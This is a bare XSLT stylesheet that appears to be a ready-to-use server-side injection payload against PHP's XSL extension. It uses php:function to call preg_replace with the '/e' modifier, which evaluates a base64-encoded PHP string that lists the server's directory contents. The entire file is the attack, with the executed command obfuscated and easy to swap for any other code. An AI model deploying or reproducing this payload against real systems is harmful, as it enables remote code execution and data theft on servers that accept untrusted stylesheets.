<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:variable name="eval">
                        eval(base64_decode('dmFyX2R1bXAoc2NhbmRpcignLicpKTs='))
                </xsl:variable>
                <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
        </xsl:template>
</xsl:stylesheet>
